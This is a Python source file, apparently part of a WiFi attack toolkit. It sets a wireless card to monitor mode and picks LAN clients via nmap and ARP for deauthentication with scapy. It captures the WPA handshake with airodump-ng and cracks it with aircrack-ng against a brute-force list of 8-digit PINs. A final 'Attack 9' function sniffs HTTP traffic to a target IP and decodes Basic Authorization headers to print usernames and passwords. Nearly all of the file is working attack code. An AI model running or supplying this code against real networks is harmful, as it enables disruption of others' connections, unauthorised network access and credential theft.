import os
import subprocess
import re
import time
import shutil
from scapy.all import *
from scapy.layers.dot11 import *
import asyncio
import pyshark


def setup_network() -> None:
    print(f"[!] Setting up network interface to allow for WiFi attacks...")
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
    subprocess.run(["airmon-ng", "start", "wlan1"], stdout=subprocess.DEVNULL)


def teardown_network() -> None:
    print(f"[!] Reverting back network interface changes...")
    subprocess.run(["airmon-ng", "stop", "wlan1mon"], stdout=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", "wlan1", "down"], stdout=subprocess.DEVNULL)
    subprocess.run(["iw", "wlan1", "set", "type", "managed"], stdout=subprocess.DEVNULL)
    subprocess.run(["systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL)


def get_iface() -> str:
    try:
        result = subprocess.run(
            ["ip", "-o", "link", "show"], capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            if "mon" in line:
                match = re.search(r"^\d+:\s+([^:]+):", line)
                if match:
                    return match.group(1).strip()
    except Exception as e:
        print(f"[-] Error: {e}")
    return None


def get_local_devices() -> list:

    subprocess.run(
        ["nmap", "-sn", "-T4", "192.168.0.0/24"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    result = subprocess.run(["arp", "-a"], capture_output=True, text=True)

    lines = [
        line
        for line in result.stdout.splitlines()
        if "<incomplete>" not in line
        and re.search(r"([0-9a-fA-F]{1,2}[:\-]){5}[0-9a-fA-F]{1,2}", line)
    ]

    for i, line in enumerate(lines):
        print(f"  {i}. {line}")
    selection = input("\n[!] List the clients you want removed (comma-separated): ")
    selected_indices = [int(x.strip()) for x in selection.split(",")]

    macs = []
    for idx in selected_indices:
        if 0 <= idx < len(lines):
            match = re.search(
                r"(([0-9a-fA-F]{1,2}[:\-]){5}[0-9a-fA-F]{1,2})", lines[idx]
            )
            if match:
                macs.append(match.group(1))
    return macs


def generate_wordlist(filename: str) -> None:

    with open(filename, "w") as f:
        for i in range(100000000):
            f.write(f"{i:08d}\n")
    print(f"Created {filename} with pins")


def send_deauth(bssid: str, client_list: list, channel: int) -> None:
    i_face = get_iface()
    subprocess.run(["iwconfig", i_face, "channel", str(channel)])

    for client in client_list:
        print(f"Sending 65 deauth requests to {client} with bssid: {bssid}")
        dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
        sendp(packet, inter=0.1, count=65, iface=i_face, verbose=1)


def capture_handshake(bssid: str, channel: int, ssid: str, client_list: list) -> str:

    i_face = get_iface()
    os.makedirs("./handshake", exist_ok=True)
    capture_file = f"./handshake/handshake-{ssid}-{bssid.replace(':', '')}"

    subprocess.run(
        ["killall", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    airodump_cmd = [
        "airodump-ng",
        "--bssid",
        bssid,
        "-c",
        str(channel),
        "-w",
        capture_file,
        "--output-format",
        "pcap",
        i_face,
    ]
    airodump_proc = subprocess.Popen(
        airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(3)

    send_deauth(bssid, client_list, channel)

    print(f"Giving client time to reconnect...")
    time.sleep(15)
    handshake_detected = False
    cap_file = f"{capture_file}-01.cap"
    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 100:
        try:
            packets = rdpcap(cap_file)
            eapol_count = sum(1 for p in packets if EAPOL in p)
            if eapol_count >= 4:
                handshake_detected = True
        except:
            pass

    airodump_proc.terminate()
    time.sleep(2)

    if handshake_detected:
        cap_file = f"{capture_file}-01.cap"
        print(f"[+] Handshake captured successfully!")
        print(f"[+] Saved to: {cap_file}")
        return cap_file
    else:
        print("[-] No handshake detected")
        return None


def crack_handshake_aircrack(pcap_file: str, wordlist: str) -> str:
    print(f"\n[*] Attempting to crack the SSID Pin now, this might take a while...")
    print(f"[*] Using wordlist: {wordlist}")

    cmd = ["aircrack-ng", "-w", wordlist, pcap_file]
    ansi_escape = re.compile(r"\x1b\[[0-9;]*[A-Za-z]|\x1b\([A-Za-z]")

    try:
        process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )

        password = None
        for line in process.stdout:
            clean_line = ansi_escape.sub("", line).strip()

            if "KEY FOUND" in clean_line:
                match = re.search(r"\[\s*(.+?)\s*\]", clean_line)
                if match:
                    password = match.group(1).strip()
                    process.terminate()
                    break

            if "Tested" in clean_line or "keys/s" in clean_line:
                print(f"\r[*] {clean_line}", end="", flush=True)

        process.wait()

        if not password:
            print("\n[-] Password not found in wordlist")

        return password

    except Exception as e:
        print(f"[-] Error running aircrack-ng: {e}")
        return None


def handshake_attack(
    bssid: str, channel: int, ssid: str, client_list: list, wordlist_path: str
) -> str:
    print(f"\n{'=' * 60}")
    print(f"Starting Handshake Attack on {ssid}")
    print(f"{'=' * 60}\n")

    setup_network()
    i_face = get_iface()

    pcap_file = capture_handshake(bssid, channel, ssid, client_list)

    if not pcap_file:
        print("[-] Handshake capture failed")
        teardown_network()
        return None

    password = crack_handshake_aircrack(pcap_file, wordlist_path)

    teardown_network()
    shutil.rmtree("handshake")
    return password


# Attack 9 - listening for password/cookie


def packet_capture(target_ip: str):
    setup_network()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    capture = pyshark.LiveCapture(interface="wlan1", eventloop=loop)
    seen = set()

    print("\n[*] Starting the packet sniffer")
    for packet in capture.sniff_continuously():
        try:
            if "ip" not in packet:
                continue
            if packet["ip"].dst == target_ip:
                if "http" in packet:
                    fields = packet.http._all_fields
                    if "http.cookie_pair" in fields:
                        cookie = unquote(fields["http.cookie_pair"])
                        if cookie in seen:
                            continue
                        else:
                            seen.add(cookie)

                        if cookie.startswith("Authorization"):
                            auth_encoded_string = cookie.removeprefix(
                                "Authorization=Basic"
                            ).strip()
                            creds_string = base64.b64decode(auth_encoded_string).decode(
                                "UTF-8"
                            )
                            username, password = creds_string.split(":")
                            print("Found credential pair:", username, password)
        except KeyboardInterrupt:
            break
        except Exception:
            continue
    print("\n[*] Stopping the packet sniffer :(")
    teardown_network()
